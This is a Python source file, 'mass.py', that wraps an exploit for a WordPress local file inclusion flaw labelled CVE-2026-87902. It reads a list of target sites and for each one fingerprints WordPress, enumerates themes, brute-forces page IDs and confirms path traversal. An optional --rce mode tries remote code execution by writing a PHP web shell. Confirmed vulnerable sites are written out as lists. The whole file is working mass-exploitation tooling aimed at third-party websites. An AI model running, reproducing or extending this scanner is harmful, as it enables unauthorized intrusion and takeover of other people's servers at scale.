#!/usr/bin/env python3
"""
mass.py — Mass scanner wrapper for CVE-2026-87902 WordPress LFI PoC
Usage: python3 mass.py targets.txt [options]
"""

from __future__ import annotations

import argparse
import concurrent.futures
import json
import sys
import time
import urllib3
from datetime import datetime
from pathlib import Path

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Import core logic from poc.py
from poc import (
    ScanResult, ThemeInfo, PageInfo,
    make_session, detect_wordpress,
    extract_active_theme, enumerate_themes,
    discover_pages, filter_exploitable_pages,
    scan_lfi, attempt_rce,
    TRAVERSAL_DEPTHS,
    DEFAULT_TIMEOUT, DEFAULT_THREADS,
)

# ---------------------------------------------------------------------------
# ANSI colors
# ---------------------------------------------------------------------------

GREEN  = "\033[92m"
RED    = "\033[91m"
YELLOW = "\033[93m"
CYAN   = "\033[96m"
RESET  = "\033[0m"
BOLD   = "\033[1m"


def cprint(color: str, msg: str):
    print(f"{color}{msg}{RESET}", flush=True)


# ---------------------------------------------------------------------------
# Single target scan
# ---------------------------------------------------------------------------

def scan_target(target: str, args) -> ScanResult:
    target = target.strip().rstrip("/")
    if not target.startswith(("http://", "https://")):
        target = "http://" + target

    extra_headers: dict[str, str] = {}
    for h in getattr(args, "header", []):
        if ":" in h:
            k, v = h.split(":", 1)
            extra_headers[k.strip()] = v.strip()

    session = make_session(extra_headers, getattr(args, "cookie", ""))
    result = ScanResult(target=target)

    try:
        # Phase 1
        wp_ver, server_hdr = detect_wordpress(session, target, False)
        result.wp_version = wp_ver
        result.server_header = server_hdr

        # Phase 2
        if getattr(args, "theme", ""):
            themes = [ThemeInfo(name=args.theme, page_dir="page-templates",
                                suffix="templates", active=True)]
        else:
            active_theme = extract_active_theme(session, target, False)
            themes = enumerate_themes(session, target, active_theme,
                                      getattr(args, "thorough", False),
                                      getattr(args, "threads", DEFAULT_THREADS), False)
        result.themes = themes

        # Phase 3 & 4
        if getattr(args, "page_id", 0):
            exploitable_pages = [PageInfo(page_id=args.page_id, slug="", template="")]
            result.pages = exploitable_pages
        else:
            pages = discover_pages(session, target,
                                   getattr(args, "thorough", False),
                                   getattr(args, "threads", DEFAULT_THREADS), False)
            result.pages = pages
            exploitable_pages = filter_exploitable_pages(pages, False)

        # depth override
        depths = [args.depth] if getattr(args, "depth", 0) else TRAVERSAL_DEPTHS[:]
        original = TRAVERSAL_DEPTHS[:]
        TRAVERSAL_DEPTHS.clear()
        TRAVERSAL_DEPTHS.extend(depths)

        # Phase 5
        lfi_result = scan_lfi(session, target, exploitable_pages, themes,
                               getattr(args, "port", 0),
                               getattr(args, "threads", DEFAULT_THREADS), False)
        result.lfi = lfi_result

        TRAVERSAL_DEPTHS.clear()
        TRAVERSAL_DEPTHS.extend(original)

        if lfi_result and lfi_result.waf_blocked:
            result.waf_detected = True
            result.waf_type = lfi_result.waf_type

        # Phase 6 RCE
        if getattr(args, "rce", False) and lfi_result and lfi_result.confirmed:
            from poc import attempt_rce
            rce_result = attempt_rce(session, target, lfi_result,
                                     getattr(args, "write_path", "/tmp/wp_shell.php"),
                                     getattr(args, "port", 0), False)
            result.rce = rce_result

    except Exception as e:
        result.server_header = f"ERROR: {e}"

    return result


# ---------------------------------------------------------------------------
# Result printer
# ---------------------------------------------------------------------------

def print_live(result: ScanResult, idx: int, total: int):
    target = result.target
    prefix = f"[{idx}/{total}]"

    if result.lfi and result.lfi.confirmed:
        cprint(GREEN, f"{BOLD}{prefix} [VULN] {target}")
        cprint(GREEN, f"        LFI: page_id={result.lfi.page.page_id} "
                      f"theme={result.lfi.theme.name} depth={result.lfi.depth}")
        if result.rce and result.rce.confirmed:
            cprint(GREEN, f"        RCE: {result.rce.uid_output}")
    elif result.waf_detected:
        cprint(YELLOW, f"{prefix} [WAF]  {target} ({result.waf_type})")
    elif result.lfi and result.lfi.waf_blocked:
        cprint(YELLOW, f"{prefix} [WAF]  {target}")
    else:
        cprint(RED, f"{prefix} [-]    {target}")


# ---------------------------------------------------------------------------
# Output writers
# ---------------------------------------------------------------------------

def write_results(results: list[ScanResult], out_dir: Path, fmt: str):
    out_dir.mkdir(parents=True, exist_ok=True)
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")

    vuln = [r for r in results if r.lfi and r.lfi.confirmed]
    waf  = [r for r in results if r.waf_detected or (r.lfi and r.lfi.waf_blocked)]
    dead = [r for r in results if r not in vuln and r not in waf]

    # Always write plain-text lists
    (out_dir / f"vuln_{ts}.txt").write_text(
        "\n".join(r.target for r in vuln) + "\n" if vuln else ""
    )
    (out_dir / f"waf_{ts}.txt").write_text(
        "\n".join(r.target for r in waf) + "\n" if waf else ""
    )
    (out_dir / f"dead_{ts}.txt").write_text(
        "\n".join(r.target for r in dead) + "\n" if dead else ""
    )

    if fmt == "json":
        from poc import result_to_dict
        data = [result_to_dict(r) for r in results]
        (out_dir / f"results_{ts}.json").write_text(
            json.dumps(data, indent=2)
        )

    print(f"\n[*] Results saved to: {out_dir}/")
    print(f"    vuln_{ts}.txt  — {len(vuln)} vulnerable")
    print(f"    waf_{ts}.txt   — {len(waf)} WAF blocked")
    print(f"    dead_{ts}.txt  — {len(dead)} not vulnerable")


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def parse_args():
    p = argparse.ArgumentParser(
        description="Mass scanner for CVE-2026-87902 WordPress LFI",
        formatter_class=argparse.RawTextHelpFormatter,
    )
    p.add_argument("targets", help="File with one URL per line")
    p.add_argument("--rce", action="store_true",
                   help="Attempt RCE after LFI confirmed")
    p.add_argument("--write-path", default="/tmp/wp_shell.php",
                   help="PHP stub path for RCE (default: /tmp/wp_shell.php)")
    p.add_argument("--thorough", action="store_true",
                   help="Probe all known themes + brute page IDs 1-200")
    p.add_argument("--threads", type=int, default=DEFAULT_THREADS,
                   help=f"Threads per target (default: {DEFAULT_THREADS})")
    p.add_argument("--mass-threads", type=int, default=5,
                   help="Concurrent targets (default: 5)")
    p.add_argument("--port", type=int, default=0,
                   help="Override destination port")
    p.add_argument("--cookie", default="", help="Cookie header")
    p.add_argument("-H", "--header", action="append", default=[], metavar="HEADER",
                   help="Extra HTTP header (repeatable)")
    p.add_argument("--output", default="mass_results",
                   help="Output directory (default: mass_results)")
    p.add_argument("--format", choices=["txt", "json"], default="txt",
                   help="Output format (default: txt)")
    p.add_argument("--theme", default="", help="Force theme name")
    p.add_argument("--page-id", type=int, default=0, help="Force page_id")
    p.add_argument("--depth", type=int, default=0, help="Force traversal depth")
    p.add_argument("--delay", type=float, default=0.0,
                   help="Delay in seconds between targets (default: 0)")
    return p.parse_args()


def main():
    args = parse_args()

    target_file = Path(args.targets)
    if not target_file.exists():
        print(f"[-] File not found: {args.targets}")
        sys.exit(1)

    targets = [
        line.strip() for line in target_file.read_text().splitlines()
        if line.strip() and not line.startswith("#")
    ]

    if not targets:
        print("[-] No targets found in file.")
        sys.exit(1)

    total = len(targets)
    print(f"""
╬═══════════════════════════════════════════════════════════════╪
║  CVE-2026-87902 — WordPress LFI Mass Scanner                 ║
╚═══════════════════════════════════════════════════════════════╝
[*] Targets      : {total}
[*] Mass threads : {args.mass_threads}
[*] Per-target   : {args.threads} threads
[*] RCE          : {args.rce}
[*] Output dir   : {args.output}
""")

    results: list[ScanResult] = []
    completed = 0

    with concurrent.futures.ThreadPoolExecutor(max_workers=args.mass_threads) as ex:
        futures = {}
        target_iter = iter(targets)
        active = 0

        # seed initial batch
        for t in target_iter:
            futures[ex.submit(scan_target, t, args)] = t
            active += 1
            if active >= args.mass_threads * 2:
                break

        while futures:
            done, _ = concurrent.futures.wait(
                futures, return_when=concurrent.futures.FIRST_COMPLETED
            )
            for future in done:
                completed += 1
                t = futures.pop(future)
                try:
                    result = future.result()
                except Exception as e:
                    result = ScanResult(target=t, server_header=f"ERROR: {e}")
                results.append(result)
                print_live(result, completed, total)
                if args.delay > 0:
                    time.sleep(args.delay)

                # submit next target
                try:
                    nt = next(target_iter)
                    futures[ex.submit(scan_target, nt, args)] = nt
                except StopIteration:
                    pass

    # Summary
    vuln_count = sum(1 for r in results if r.lfi and r.lfi.confirmed)
    rce_count  = sum(1 for r in results if r.rce and r.rce.confirmed)
    waf_count  = sum(1 for r in results if r.waf_detected or (r.lfi and r.lfi.waf_blocked))

    print(f"\n{'='*65}")
    print(f"SCAN COMPLETE  — {total} targets")
    print(f"  {GREEN}VULNERABLE : {vuln_count}{RESET}")
    print(f"  {GREEN}RCE        : {rce_count}{RESET}")
    print(f"  {YELLOW}WAF BLOCKED: {waf_count}{RESET}")
    print(f"  {RED}NOT VULN   : {total - vuln_count - waf_count}{RESET}")
    print(f"{'='*65}")

    write_results(results, Path(args.output), args.format)


if __name__ == "__main__":
    main()
